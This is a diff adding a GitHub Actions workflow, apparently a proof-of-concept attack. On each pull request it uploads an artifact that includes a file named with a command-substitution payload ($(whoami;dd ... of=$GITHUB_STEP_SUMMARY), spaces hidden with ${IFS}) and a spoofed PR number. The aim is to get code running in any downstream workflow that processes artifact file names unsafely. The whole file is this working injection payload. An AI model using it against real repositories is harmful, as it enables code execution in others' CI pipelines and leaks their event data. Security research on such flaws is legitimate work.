@@ -1,0 +1,20 @@
+name: ADI Test
+
+on:
+  pull_request:
+
+jobs:
+  craft:
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft payload artifact
+        run: |
+          mkdir -p payload
+          printf 'PROOF-OF-CODE-EXECUTION\n' > 'payload/runner.txt'
+          printf 'PROOF-OF-CODE-EXECUTION\n' > 'payload/$(whoami;dd${IFS}if=$GITHUB_EVENT_PATH${IFS}of=$GITHUB_STEP_SUMMARY).txt'
+          printf '135\n' > 'payload/pr_number.txt'
+          ls -la payload
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content-proof
+          path: payload
